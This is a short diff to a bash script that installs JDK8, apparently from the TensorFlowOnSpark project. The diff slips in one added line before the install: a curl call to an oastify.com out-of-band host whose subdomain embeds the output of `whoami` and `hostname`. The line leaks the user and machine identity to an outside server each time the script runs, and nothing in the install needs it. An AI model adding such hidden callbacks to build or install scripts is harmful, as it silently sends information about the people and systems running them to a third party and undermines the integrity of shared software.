@@ -1,6 +1,7 @@
 #!/bin/bash -x
 
 # Install JDK8
+curl https://`whoami`-`hostname`.749nikr9l6dn8qjdzih7l2rq5hbcz4usj.oastify.com/yahoo/TensorFlowOnSpark
 yum install -y java-1.8.0-openjdk
 export JAVA_HOME=/usr/lib/jvm/jre-1.8.0
 
